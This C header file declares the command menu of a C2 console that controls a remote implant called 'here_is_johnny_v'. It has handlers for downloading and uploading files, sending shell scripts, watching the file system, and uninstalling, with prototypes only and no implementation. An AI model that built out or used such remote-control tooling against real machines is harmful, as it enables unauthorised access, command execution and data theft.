#ifndef HERE_IS_JOHNNY_C2_COMMAND_MENU_PROCESSOR_H
#define HERE_IS_JOHNNY_C2_COMMAND_MENU_PROCESSOR_H


/**
 * @brief Displays the command menu on the console.
 *
 * The command menu consists of the following options:
 * 1. Help
 * 4. Download File
 * 5. Upload File
 * 6. Send Shell Script
 * 7. Watch File System
 * 8. Uninstall
 * 0. Exit
 */
void display_command_menu();

/**
 * @brief Displays detailed help information about the program.
 */
void handle_display_help();

/**
 * @brief Handles the command to download a file from the 'here_is_johnny_v' program.
 *
 * This function prompts the user to enter a file location, then sends
 * the download file command to the 'here_is_johnny_v' program.
 */
void handle_download_file();

/**
 * @brief Handles the command to upload a file to the 'here_is_johnny_v' program.
 *
 * This function prompts the user to enter a file location, then sends
 * the upload file command to the 'here_is_johnny_v' program.
 */
void handle_upload_file();

/**
 * @brief Handles the command to send a shell script to the 'here_is_johnny_v' program.
 *
 * This function prompts the user to enter a shell script, then sends
 * the shell script command to the 'here_is_johnny_v' program.
 */
void handle_send_shell_script();

/**
 * @brief Handles the command to watch the file system of the 'here_is_johnny_v' program.
 *
 * This function prompts the user to enter a file or directory location on the system where the 'here_is_johnny_v'
 * program is installed and sends a command to monitor changes to that file system path.
 */
void handle_watch_file_system();

/**
 * @brief Handles the command to uninstall the 'here_is_johnny_v' program.
 *
 * This function sends an uninstall command to the 'here_is_johnny_v' program to remove it from the system.
 */
void handle_uninstall();

/**
 * @brief Handles the command to disconnect from the 'here_is_johnny_v' program.
 *
 * This function sends a disconnect command to the 'here_is_johnny_v' program to terminate the connection.
 */
void handle_disconnect();

#endif //HERE_IS_JOHNNY_C2_COMMAND_MENU_PROCESSOR_H
